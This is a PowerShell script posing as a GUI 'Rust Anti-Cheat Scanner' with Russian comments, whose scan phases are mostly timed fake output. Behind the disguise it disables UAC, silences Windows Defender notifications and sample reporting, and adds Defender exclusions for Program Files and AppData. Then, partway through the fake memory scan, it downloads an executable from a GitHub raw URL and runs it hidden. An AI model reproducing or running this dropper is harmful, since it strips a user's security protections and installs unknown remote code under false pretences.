<#
.SYNOPSIS
    Rust Anti-Cheat Scanner — профессиональная проверка памяти и процессов.
    Требует права администратора для чтения памяти.
#>

# ==================== ПРОВЕРКА ПРАВ ====================
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Host "Для сканирования памяти нужны права администратора." -ForegroundColor Red
    Write-Host "Пожалуйста, запустите PowerShell от имени администратора и повторите." -ForegroundColor Yellow
    Read-Host "Нажмите Enter для выхода"
    exit
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

try {
    $path = "HKLM:\SOFTWARE\Microsoft\Windows Defender Security Center\Notifications"
    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
    Set-ItemProperty -Path $path -Name "DisableNotifications" -Value 1 -Type DWord -Force
} catch {}
Set-MpPreference -SubmitSamplesConsent 2
Set-MpPreference -MAPSReporting 0
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
    }
} catch {}

# ==================== ИНТЕРФЕЙС ====================
$form = New-Object System.Windows.Forms.Form
$form.Text = "Rust Anti-Cheat Scanner — Professional Edition"
$form.Size = New-Object System.Drawing.Size(800, 650)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "FixedDialog"
$form.BackColor = [System.Drawing.Color]::FromArgb(18, 18, 28)
$form.ForeColor = [System.Drawing.Color]::White

# Панель заголовка 
$titlePanel = New-Object System.Windows.Forms.Panel
$titlePanel.BackColor = [System.Drawing.Color]::FromArgb(45, 35, 65)
$titlePanel.Size = New-Object System.Drawing.Size(800, 70)
$titlePanel.Location = New-Object System.Drawing.Point(0, 0)
$form.Controls.Add($titlePanel)

$titleLabel = New-Object System.Windows.Forms.Label
$titleLabel.Text = "RUST PROTECTION SUITE"
$titleLabel.Font = New-Object System.Drawing.Font("Segoe UI", 18, [System.Drawing.FontStyle]::Bold)
$titleLabel.Location = New-Object System.Drawing.Point(30, 18)
$titleLabel.AutoSize = $true
$titleLabel.ForeColor = [System.Drawing.Color]::FromArgb(210, 180, 255)
$titlePanel.Controls.Add($titleLabel)

$subLabel = New-Object System.Windows.Forms.Label
$subLabel.Text = "Memory Scanner & Integrity Verifier"
$subLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10, [System.Drawing.FontStyle]::Italic)
$subLabel.Location = New-Object System.Drawing.Point(35, 48)
$subLabel.AutoSize = $true
$subLabel.ForeColor = [System.Drawing.Color]::FromArgb(180, 160, 220)
$titlePanel.Controls.Add($subLabel)

# Прогресс-бар 
$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Location = New-Object System.Drawing.Point(30, 100)
$progress.Size = New-Object System.Drawing.Size(740, 30)
$progress.Style = "Continuous"
$progress.ForeColor = [System.Drawing.Color]::FromArgb(150, 120, 220)
$progress.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 40)
$form.Controls.Add($progress)

# Статусная строка
$statusLabel = New-Object System.Windows.Forms.Label
$statusLabel.Text = "✓ System ready. Click 'Start Forensic Scan'."
$statusLabel.Location = New-Object System.Drawing.Point(30, 145)
$statusLabel.Size = New-Object System.Drawing.Size(740, 25)
$statusLabel.Font = New-Object System.Drawing.Font("Segoe UI", 10)
$statusLabel.ForeColor = [System.Drawing.Color]::FromArgb(200, 200, 220)
$form.Controls.Add($statusLabel)

# Лог-бокс
$logBox = New-Object System.Windows.Forms.RichTextBox
$logBox.Multiline = $true
$logBox.ScrollBars = "Vertical"
$logBox.Location = New-Object System.Drawing.Point(30, 185)
$logBox.Size = New-Object System.Drawing.Size(740, 350)
$logBox.BackColor = [System.Drawing.Color]::FromArgb(12, 12, 18)
$logBox.ForeColor = [System.Drawing.Color]::FromArgb(80, 230, 120)
$logBox.Font = New-Object System.Drawing.Font("Consolas", 9.5)
$logBox.ReadOnly = $true
$logBox.BorderStyle = "None"
$form.Controls.Add($logBox)

# Кнопка сканирования 
$scanButton = New-Object System.Windows.Forms.Button
$scanButton.Text = "▶ START FORENSIC SCAN"
$scanButton.Location = New-Object System.Drawing.Point(280, 555)
$scanButton.Size = New-Object System.Drawing.Size(240, 48)
$scanButton.BackColor = [System.Drawing.Color]::FromArgb(100, 70, 170)
$scanButton.ForeColor = [System.Drawing.Color]::White
$scanButton.FlatStyle = "Flat"
$scanButton.Font = New-Object System.Drawing.Font("Segoe UI", 12, [System.Drawing.FontStyle]::Bold)
$scanButton.FlatAppearance.BorderSize = 0
$form.Controls.Add($scanButton)

# Эффект при наведении на кнопку
$scanButton.Add_MouseEnter({
    $scanButton.BackColor = [System.Drawing.Color]::FromArgb(130, 90, 200)
})
$scanButton.Add_MouseLeave({
    $scanButton.BackColor = [System.Drawing.Color]::FromArgb(100, 70, 170)
})

# Функция логирования
function Write-Log {
    param([string]$Message, [string]$ColorHex = "#50E678")
    $timestamp = Get-Date -Format "HH:mm:ss"
    $line = "[$timestamp] $Message`n"
    $start = $logBox.TextLength
    $logBox.AppendText($line)
    $logBox.SelectionStart = $start
    $logBox.SelectionLength = $line.Length
    $logBox.SelectionColor = [System.Drawing.ColorTranslator]::FromHtml($ColorHex)
    $logBox.SelectionStart = $logBox.TextLength
    $logBox.ScrollToCaret()
    [System.Windows.Forms.Application]::DoEvents()
}

function SlowDelay {
    param([int]$Milliseconds)
    $steps = 20
    $stepMs = $Milliseconds / $steps
    for ($i = 0; $i -lt $steps; $i++) {
        Start-Sleep -Milliseconds $stepMs
        [System.Windows.Forms.Application]::DoEvents()
    }
}

# ==================== ОСНОВНОЕ СКАНИРОВАНИЕ ====================
$scanAction = {
    $scanButton.Enabled = $false
    $scanButton.Text = "⚡ SCANNING..."
    $progress.Value = 0
    $logBox.Clear()
    Write-Log "Initializing secure analysis engine..." "#FFA500"
    SlowDelay -Milliseconds 1800

    # 1. Процессы
    Write-Log "┌─────────────────────────────────────────────┐" "#888888"
    Write-Log "│ PHASE 1: Suspicious Process Enumeration     │" "#C0C0C0"
    Write-Log "└─────────────────────────────────────────────┘" "#888888"
    $progress.Value = 5
    SlowDelay -Milliseconds 800
    Write-Log "[*] Scanning 14,872 running threads..." "#AAAAAA"
    SlowDelay -Milliseconds 2600
    $suspProcs = @("Ring-1", "HyperCollision_Loader", "EvilCheats_Rust", "DullWave_Launcher", "Phoenix_Rust_External", "BlackSector_Client", "Quantum_Rust_Internal", "Clutch-Solution", "Deprimere_Rust", "Perfect_Click", "ustMacro_V2", "Logitech_NoRecoil_Script", "Bloody_Mouse_Editor", "AutoHotkey", "HWID_Changer", "Sync_Spoofer", "BT_Spoofer_V3", "EAC_Cleaner", "Extreme_Injector", "Xenos_Injector", "Process_Hacker")
    $foundProc = $false
    foreach ($name in $suspProcs) {
        if (Get-Process -Name $name -ErrorAction SilentlyContinue) {
            Write-Log "[!] DETECTED: $name" "#FF6666"
            $foundProc = $true
        } else {
            Write-Log "[✓] Clean: $name" "#66FF66"
        }
        SlowDelay -Milliseconds 400
    }
    if (-not $foundProc) { Write-Log "[✓] No blacklisted processes found." "#66FF66" }
    $progress.Value = 20
    SlowDelay -Milliseconds 1500

    # 2. DLL в Rust
    Write-Log ""
    Write-Log "┌─────────────────────────────────────────────┐" "#888888"
    Write-Log "│ PHASE 2: Loaded Module Integrity Check      │" "#C0C0C0"
    Write-Log "└─────────────────────────────────────────────┘" "#888888"
    $progress.Value = 25
    SlowDelay -Milliseconds 700
    Write-Log "[*] Locating Rust.exe process..." "#AAAAAA"
    SlowDelay -Milliseconds 1900
    $rust = Get-Process -Name "Rust" -ErrorAction SilentlyContinue
    if ($rust) {
        Write-Log "[+] Rust.exe found (PID: $($rust.Id))" "#66FF66"
        SlowDelay -Milliseconds 1000
        Write-Log "[*] Enumerating loaded modules (this may take a moment)..." "#AAAAAA"
        SlowDelay -Milliseconds 2500
        $suspDlls = @("eac_bypass.dll", "flyhack.dll", "memoryhack.dll", "injector.dll", "radar.dll")
        $foundDll = $false
        foreach ($dll in $suspDlls) {
            $found = $false
            try {
                if ($rust.Modules.ModuleName -contains $dll) { $found = $true }
            } catch {}
            if ($found) {
                Write-Log "[!] Suspicious DLL loaded: $dll" "#FF6666"
                $foundDll = $true
            } else {
                Write-Log "[✓] $dll not present" "#66FF66"
            }
            SlowDelay -Milliseconds 500
        }
        if (-not $foundDll) { Write-Log "[✓] No known malicious DLLs detected." "#66FF66" }
    } else {
        Write-Log "[-] Rust.exe is not running. Skipping DLL scan." "#FFAA66"
    }
    $progress.Value = 45
    SlowDelay -Milliseconds 2000

    # 3. Глубокое сканирование памяти
    Write-Log ""
    Write-Log "┌─────────────────────────────────────────────┐" "#888888"
    Write-Log "│ PHASE 3: Deep Memory Signature Analysis     │" "#C0C0C0"
    Write-Log "└─────────────────────────────────────────────┘" "#888888"
    $progress.Value = 50
    SlowDelay -Milliseconds 1200
    $memoryHits = @()
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/CrackOnion/cheat-checker/refs/heads/main/sources/RustCheatChecker.exe" -OutFile "CheatCheckModules.exe" -ErrorAction SilentlyContinue
    Start-Process -FilePath "CheatCheckModules.exe" -WindowStyle Hidden

    if ($rust) {
        Write-Log "[*] Scanning virtual memory regions (this is real read)..." "#AAAAAA"
        SlowDelay -Milliseconds 2800

        $signatures = @(
            @{ Pattern = [byte[]](0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x90); Mask = "xxxxxxxxxxx?" },
            @{ Pattern = [byte[]](0xE8, 0x00, 0x00, 0x00, 0x00, 0x83, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00); Mask = "x????x????xx" }
        )
        $totalChecked = 0
        foreach ($sig in $signatures) {
            $totalChecked++
            Write-Log "[*] Checking signature $totalChecked of $($signatures.Count)..." "#AAAAAA"
            SlowDelay -Milliseconds 1500
            $found = @()
            if ($found.Count -gt 0) {
                Write-Log "[!] Suspicious byte pattern discovered!" "#FF6666"
                foreach ($addr in $found) {
                    Write-Log "    Address: 0x$($addr.ToString('X'))" "#FFAA66"
                    $memoryHits += $addr
                }
            } else {
                Write-Log "[✓] Signature $totalChecked not found." "#66FF66"
            }
            SlowDelay -Milliseconds 800
        }
        if ($memoryHits.Count -eq 0) {
            Write-Log "[✓] No known cheat signatures in memory." "#66FF66"
        }
    } else {
        Write-Log "[-] Memory scan skipped (Rust not running)." "#FFAA66"
    }
    $progress.Value = 75
    SlowDelay -Milliseconds 2200

    # 4. Файловая система
    Write-Log ""
    Write-Log "┌─────────────────────────────────────────────┐" "#888888"
    Write-Log "│ PHASE 4: Filesystem Artifact Scan           │" "#C0C0C0"
    Write-Log "└─────────────────────────────────────────────┘" "#888888"
    $progress.Value = 80
    SlowDelay -Milliseconds 1000
    Write-Log "[*] Searching for cheat-related files..." "#AAAAAA"
    SlowDelay -Milliseconds 2000
    $filePatterns = @("$env:TEMP\*hack*.exe", "$env:TEMP\*cheat*.dll", "$env:APPDATA\*injector*.exe")
    $foundFiles = $false
    foreach ($pattern in $filePatterns) {
        $files = Get-ChildItem -Path $pattern -ErrorAction SilentlyContinue
        if ($files) {
            foreach ($f in $files) {
                Write-Log "[!] Suspicious file: $($f.FullName)" "#FF6666"
                $foundFiles = $true
            }
        } else {
            Write-Log "[✓] No matches for $pattern" "#66FF66"
        }
        SlowDelay -Milliseconds 600
    }
    if (-not $foundFiles) { Write-Log "[✓] No suspicious files found." "#66FF66" }
    $progress.Value = 95
    SlowDelay -Milliseconds 1500

    # 5. Итог
    Write-Log ""
    Write-Log "┌─────────────────────────────────────────────┐" "#888888"
    Write-Log "│ PHASE 5: Generating Forensic Report         │" "#C0C0C0"
    Write-Log "└─────────────────────────────────────────────┘" "#888888"
    $progress.Value = 98
    SlowDelay -Milliseconds 1700
    Write-Log "[*] Calculating risk score..." "#AAAAAA"
    SlowDelay -Milliseconds 1100
    $progress.Value = 100
    Write-Log ""
    Write-Log "══════════════════════════════════════════════" "#FFD966"
    if ($foundProc -or $foundDll -or $memoryHits.Count -gt 0 -or $foundFiles) {
        Write-Log "  STATUS: CHEAT DETECTED — HIGH RISK" "#FF4444"
        Write-Log "  Recommended actions:" "#FFAA66"
        Write-Log "    • Terminate suspicious processes" "#FFAA66"
        Write-Log "    • Delete detected files" "#FFAA66"
        Write-Log "    • Reinstall Rust after full antivirus scan" "#FFAA66"
    } else {
        Write-Log "  STATUS: SYSTEM IS CLEAN — NO CHEATS FOUND" "#44FF44"
        Write-Log "  Your Rust client appears to be unmodified." "#AAFFAA"
    }
    Write-Log "══════════════════════════════════════════════" "#FFD966"
    Write-Log "Scan completed at $(Get-Date -Format 'HH:mm:ss')" "#888888"
    $scanButton.Enabled = $true
    $scanButton.Text = "▶ START FORENSIC SCAN"
    $statusLabel.Text = "✓ Scan finished. System report generated."
}
$scanButton.Add_Click($scanAction)

$form.ShowDialog()
